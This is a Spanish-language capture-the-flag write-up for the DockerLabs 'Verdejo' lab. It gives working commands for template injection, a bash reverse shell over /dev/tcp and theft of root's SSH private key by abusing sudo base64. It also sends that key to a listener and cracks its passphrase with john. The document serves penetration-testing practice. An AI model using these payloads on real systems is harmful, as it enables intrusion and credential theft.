Verdejo-DockerLabs🇪🇸

**1.1Primero vamos a descomprimir el archivo facilitado y moverlo a nuestra zona de trabajo.**
```bash
unzip verdejo.zip 
```

<img width="750" height="185" alt="image" src="https://github.com/user-attachments/assets/1a01fa0f-3b61-4bc6-9877-1ea26208a735" />


**1.2 Ahora vamos a proceder a preparar el laboratorio.**
```bash
 sudo bash ./auto_deploy.sh verdejo.tar 
```

<img width="757" height="428" alt="image" src="https://github.com/user-attachments/assets/6659a1d5-4f25-46a7-9345-5f0e50c78835" />


**2.1 Vamos a comprobar la conexión mediante un ping.**
```bash
ping -c3 172.17.0.2
```

<img width="759" height="165" alt="image" src="https://github.com/user-attachments/assets/78fc061e-f461-4e8d-8bd2-7358d5d6229d" />


**2.2 Necesitamos conocer los puertos abiertos del sistema y para ello vamos a usar nmap.**
```bash
nmap -sCV -p- 172.17.0.2
```

**2.3 Al ver el puerto abiero 8089 entraremos por ese a la ver y empezaremos a probar tipos de acciones que realiza**


<img width="1167" height="602" alt="image" src="https://github.com/user-attachments/assets/f28c3683-8d12-4c40-b7a0-0189c3579f39" />



**2.4 Al ver que acepta expresiones probaremos la vulnerabilidad SSTI**
```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}
```

<img width="1174" height="525" alt="image" src="https://github.com/user-attachments/assets/995562cc-3933-4527-81e2-9fffa6e3d9bf" />


*Asi podremos comprobar que el usuario se llama verde.*


**3.1 Ahora vamos a abrir el nc para que nos escuche.**
```bash
nc -lvnp 4444
```

<img width="748" height="51" alt="image" src="https://github.com/user-attachments/assets/264a74f9-77e1-4105-9973-c951be35ee72" />


**3.2 Vamos a introducir este script para que pueda entrar a la máquina desde el nc.**
```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1"').read() }}
```

<img width="1185" height="396" alt="image" src="https://github.com/user-attachments/assets/d696f49d-bc0a-48fe-878e-df3b8f3ca555" />


**3.3 Entraremos mediante la terminal.**

<img width="706" height="115" alt="image" src="https://github.com/user-attachments/assets/61597760-04c1-4c4e-91a0-bd570a0c2e1e" />


**4.1 Ahora para proceder a escalar privilegios vamos a realizar un `sudo -l` para poder ver los binarios.**

<img width="752" height="144" alt="image" src="https://github.com/user-attachments/assets/12ba11c2-8126-40ac-8c67-2b0d6fbb9a17" />


**4.2 Ahora nos redirigimos a `/var/www/html/ssti`**

<img width="754" height="455" alt="image" src="https://github.com/user-attachments/assets/f1452c63-935d-4939-88ba-5da8fbbb0f9f" />


**4.3 Ahora vamos a ver la private key  ejecutando `sudo /usr/bin/base64 /root/.ssh/id_rsa | base64 --decode`**

<img width="752" height="796" alt="image" src="https://github.com/user-attachments/assets/6fa27d99-77ea-498e-8c24-1a25af9c5a36" />


**4.4 Ahora abro otra terminal y meto en el nano id_rsa_root todo el hash y le doy permisos**
```bash
nano id_rsa_root
chmod 600 id_rsa_root
```

<img width="718" height="55" alt="image" src="https://github.com/user-attachments/assets/3c128dee-afdc-4e8e-8a16-d51267b74462" />


**4.5 Ahora en esa terminal empezamos a escucha con 445**
```bash
nc -lvnp 4445 > id_rsa_root
```

**4.6 Volveremos por un momento a el equipo de verde a ejecutar la codificación.**
```bash
sudo /usr/bin/base64 /root/.ssh/id_rsa | base64 --decode > /dev/tcp/172.17.0.1/4445
```

<img width="742" height="72" alt="image" src="https://github.com/user-attachments/assets/fc885298-3b8e-4c2b-961e-b53e7f2bcfcd" />



**4.7 En la terminal de tu equipo ejecutaremos el ssh2john**
```bash
chmod 600 id_rsa_root
ssh2john id_rsa_root > hash_root.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash_root.txt
```

<img width="767" height="274" alt="image" src="https://github.com/user-attachments/assets/651d6a70-615f-4e83-a021-5c5bad2ee768" />


**4.8 Ya sabiendo que la contraseña de root es `honda1` accederemos por ssh.**
```bash
 ssh -i id_rsa_root root@172.17.0.2
```

<img width="751" height="591" alt="image" src="https://github.com/user-attachments/assets/b5b7292a-01ea-4bb2-8a6a-18d9fba654f2" />


**Confirmamos que no hay ninguna bandera en root.**

<img width="756" height="196" alt="image" src="https://github.com/user-attachments/assets/897fb777-ba94-48cb-a8de-203186c92f5b" />

